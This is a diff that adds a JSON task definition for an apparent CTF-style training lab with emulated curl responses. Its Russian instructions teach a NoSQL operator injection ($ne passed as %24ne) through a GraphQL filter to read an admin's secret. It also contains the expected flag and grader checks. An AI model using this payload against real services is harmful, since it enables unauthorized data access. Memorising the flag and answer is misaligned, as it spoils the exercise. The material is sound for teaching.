@@ -1,0 +1,37 @@
+{
+  "id": "web-graphql-nosql",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{gr4phql_n0sql_0p3r4t0r_1nj3ct}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: GraphQL NoSQL-инъекция\n\nPOST /graphql, резолвер users(filter:) кладёт фильтр прямо в MongoDB.\nОбойди ограничение роли и найди запись администратора.\n\n1. Обычный фильтр (role=user):\n   curl -s -X POST 'https://app.target/graphql' -H 'Content-Type: application/json' --data '{\"query\":\"{ users { name role } }\"}'\n2. Оператор $ne передай как %24ne (движок лабы съедает литеральный $):\n   curl -s -X POST 'https://app.target/graphql' -H 'Content-Type: application/json' --data '{\"query\":\"{ users(filter: \\\"{\\\\\\\"role\\\\\\\":{\\\\\\\"%24ne\\\\\\\":\\\\\\\"x\\\\\\\"}}\\\") { name role secret } }\"}'\n3. В ответе будет запись с флагом — запиши её в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/graphql)",
+      "cases": [
+        {
+          "match": "%24ne|%24gt|%24regex",
+          "example": "-X POST '.../graphql' --data '{\"query\":\"{ users(filter: ... %24ne ...) { name role secret } }\"}'",
+          "output": "{\"data\":{\"users\":[{\"name\":\"admin\",\"role\":\"admin\",\"secret\":\"nto{gr4phql_n0sql_0p3r4t0r_1nj3ct}\"}]}}\n"
+        },
+        {
+          "match": "graphql",
+          "example": "-X POST '.../graphql' --data '{\"query\":\"{ users { name role } }\"}'",
+          "output": "{\"data\":{\"users\":[{\"name\":\"bob\",\"role\":\"user\"}]}}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /graphql на app.target.\n"
+    }
+  }
+}
